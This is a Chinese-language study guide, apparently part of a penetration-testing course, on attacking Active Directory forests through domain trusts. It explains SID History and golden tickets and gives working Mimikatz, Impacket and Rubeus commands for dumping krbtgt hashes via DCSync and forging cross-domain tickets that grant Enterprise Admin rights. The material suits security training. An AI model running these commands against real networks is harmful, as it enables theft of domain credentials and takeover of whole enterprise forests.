# 域森林攻击 - 新手章节指南

## 这个目录是干什么的？

大型企业通常有多个域，这些域组成森林。域之间有信任关系，可以被利用来跨域攻击。这个目录教你如何利用域信任进行攻击。

---

## 为什么要学这个？

```
域森林攻击的价值：
├── 企业可能有多个域
├── 你可能只控制了一个子域
├── 需要攻击到父域或其他域
├── 最终目标是整个森林
└── 这是域渗透的最高级技术

现实场景：
├── 你获得了 child.corp.local 的域管理员
├── 但真正的目标在 corp.local（父域）
├── 利用域信任关系
├── 从子域攻击到父域
└── 获得整个森林的控制权
```

## 通俗理解核心概念

### 什么是域信任？

```
域信任 = 域之间的"互信协议"

类比：
├── 域 A 和域 B 建立了信任
├── 就像两个国家签了互免签证协议
├── A 国的公民可以去 B 国
├── B 国的公民可以去 A 国
└── 但具体能做什么还有限制

信任类型：
├── 单向信任：A 信任 B，但 B 不信任 A
├── 双向信任：A 和 B 互相信任
├── 传递信任：A 信任 B，B 信任 C，则 A 信任 C
└── 非传递信任：信任不会传递
```

### 森林内信任 vs 森林间信任

```
森林内信任（Intra-Forest）：
├── 同一个森林内的域之间
├── 父域和子域之间
├── 自动建立双向传递信任
├── 相对容易利用
└── 可以使用 SID History 攻击

森林间信任（Inter-Forest）：
├── 不同森林之间
├── 需要手动建立
├── 通常是非传递的
├── 有 SID 过滤保护
└── 更难利用
```

### SID History 攻击

```
什么是 SID History？
├── 用户迁移时保留旧的 SID
├── 确保用户仍能访问旧资源
├── 存储在用户对象的属性中
└── 可以被伪造

攻击原理：
├── 在子域创建金票
├── 在票据中添加父域管理员的 SID
├── 作为 SID History
├── 父域会认为你是管理员
└── 获得父域的控制权

限制：
├── 只在森林内有效
├── 森林间有 SID 过滤
├── 会过滤掉外部森林的 SID
└── 需要其他方法
```

### 金票（Golden Ticket）

```
什么是金票？
├── 伪造的 TGT（Ticket Granting Ticket）
├── 使用 krbtgt 账户的哈希签名
├── 可以冒充任何用户
├── 有效期可以很长
└── 是域持久化的终极方法

制作金票需要：
├── 域的 SID
├── krbtgt 账户的哈希
├── 要冒充的用户名
└── 域名

跨域金票：
├── 在金票中添加目标域管理员的 SID
├── 作为 SID History
├── 可以跨域使用
└── 实现从子域到父域的攻击
```

## 实践任务清单

### 任务1：枚举域信任

```powershell
# 使用 PowerView
Get-DomainTrust
Get-ForestTrust

# 使用 ADModule
Get-ADTrust -Filter *

# 使用 nltest
nltest /domain_trusts

# 获取森林信息
Get-Forest
Get-ForestDomain
```

### 任务2：获取 krbtgt 哈希

```powershell
# 使用 Mimikatz DCSync
lsadump::dcsync /domain:child.corp.local /user:krbtgt

# 使用 Impacket
python secretsdump.py child.corp.local/admin:password@dc2.child.corp.local
```

### 任务3：制作跨域金票

```powershell
# 使用 Mimikatz
# 需要：子域 krbtgt 哈希、父域 SID、子域 SID

kerberos::golden /user:Administrator /domain:child.corp.local /sid:S-1-5-21-child-sid /krbtgt:krbtgt_hash /sids:S-1-5-21-parent-sid-519 /ptt

# S-1-5-21-parent-sid-519 是父域 Enterprise Admins 组的 SID
# 519 是 Enterprise Admins 的 RID
```

### 任务4：使用 Rubeus

```powershell
# 使用 Rubeus 制作金票
Rubeus.exe golden /user:Administrator /domain:child.corp.local /sid:S-1-5-21-child-sid /krbtgt:krbtgt_hash /sids:S-1-5-21-parent-sid-519 /ptt

# 验证
dir \\dc1.corp.local\c$
```

## 攻击流程总结

```
从子域到父域的攻击流程：

1. 获得子域的域管理员权限
   └── 通过之前学的各种技术

2. 获取子域的 krbtgt 哈希
   └── 使用 DCSync

3. 获取父域的 SID
   └── 使用 Get-DomainSID 或 PowerView

4. 制作带有 SID History 的金票
   └── 添加父域 Enterprise Admins 的 SID

5. 使用金票访问父域
   └── 现在你是父域的管理员了

6. 获取父域的 krbtgt 哈希
   └── 完全控制整个森林
```

## 与 ACL/委派章节的边界

`16：ad间攻击向量.html` 前半部分会出现 GenericAll、WriteDACL 和 Kerberos 委派，但本目录重点只放森林/跨森林。

| 看到的内容 | 主章节 |
|---|---|
| GenericAll、GenericWrite、WriteDACL、WriteOwner | `16-AD权限滥用` |
| 无约束委派、约束委派、RBCD | `17-Kerberos委派` |
| 森林内信任、父子域、Extra SID | `18-域森林攻击` |
| 跨森林信任、SID Filtering、选择性认证 | `18-域森林攻击` |
| SQL Link 跨域/跨森林 | `15-MSSQL攻击` + `18-域森林攻击/05-跨域跨森林考试速查.md` |

考试可用总结：先判断“我是在滥用对象权限、委派配置，还是信任边界”。边界判断清楚后，命令和证据才不会散。
